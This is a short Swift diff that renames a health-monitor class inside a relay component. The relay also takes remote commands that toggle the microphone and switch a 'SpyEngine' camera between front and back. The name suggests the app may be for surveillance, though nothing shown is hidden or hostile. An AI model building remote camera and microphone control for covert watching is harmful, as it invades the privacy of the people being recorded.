@@ -20,7 +20,7 @@ final class Relay {
 
     private func ping() {
         task?.sendPing { [weak self] err in
-            if err != nil { Health.fail(.pushAlerts, "Relay unreachable") }
+            if err != nil { HealthMon.fail(.pushAlerts, "Relay unreachable") }
             else { Outbox.shared.flush() }
         }
         DispatchQueue.main.asyncAfter(deadline: .now() + 15) { self.ping() }
@@ -50,7 +50,7 @@ final class Relay {
         case "micOff":     Settings.shared.set(.mic, false, remote: true); MicGate.shared.apply()
         case "front":      SpyEngine.shared.cameraPosition = .front
         case "back":       SpyEngine.shared.cameraPosition = .back
-        case "recheck":    Health.shared.sweep()
+        case "recheck":    HealthMon.shared.sweep()
         case "openSettings":
             if let u = URL(string: UIApplication.openSettingsURLString) {
                 DispatchQueue.main.async { UIApplication.shared.open(u) }
